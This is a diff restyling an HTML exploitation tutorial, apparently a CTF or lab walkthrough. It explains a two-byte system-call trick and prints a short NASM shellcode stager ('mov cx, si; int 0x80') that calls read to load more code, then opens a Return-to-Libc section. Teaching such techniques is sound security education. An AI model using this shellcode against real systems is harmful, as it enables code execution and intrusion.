 <ul class="org-ul">
-<li>All you need to do now is find an efficient way to copy <span class="verbatim">ESI</span> into <span class="verbatim">ECX</span> (the source register for the <span class="verbatim">read</span> system call)</li>
+<li>All you need to do now is find an efficient way to copy <code>ESI</code> into <code>ECX</code> (the source register for the <code>read</code> system call)</li>
 <li>Actually invoking a system call.</li>
 </ul>
 
@@ -387,8 +387,8 @@ that moves the contents of ESI into ECX will do.
 </p>
 
 <p>
-After this, you need to initiate a system call, you can use either <span class="verbatim">sysenter</span>
-or <span class="verbatim">int 0x80</span> as both are encoded in 2 bytes.
+After this, you need to initiate a system call, you can use either <code>sysenter</code>
+or <code>int 0x80</code> as both are encoded in 2 bytes.
 </p>
 
 <p>
@@ -396,8 +396,8 @@ All told, the following shellcode should do just fine.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-nasm"><span style="color: #006FE0;">mov</span> <span style="color: #BA36A5;">cx</span>, <span style="color: #BA36A5;">si</span>
-<span style="color: #006FE0;">int</span> <span style="color: #D0372D;">0x80</span>
+<pre class="src src-nasm"><span style="color: #657b83; font-weight: bold;">mov</span> <span style="color: #268bd2;">cx</span>, <span style="color: #268bd2;">si</span>
+<span style="color: #657b83; font-weight: bold;">int</span> <span style="color: #6c71c4;">0x80</span>
 </pre>
 </div>
 
@@ -427,9 +427,9 @@ v7`v`v7`vyy`v`vp7x%
 </div>
 </div>
 
-<div id="outline-container-org754e734" class="outline-4">
-<h4 id="org754e734">Return-to-Libc</h4>
-<div class="outline-text-4" id="text-org754e734">
+<div id="outline-container-orgec300ef" class="outline-4">
+<h4 id="orgec300ef">Return-to-Libc</h4>
+<div class="outline-text-4" id="text-orgec300ef">
 <p>
 This is a little trickier, you need to abuse at least two different tricks here.
 </p>
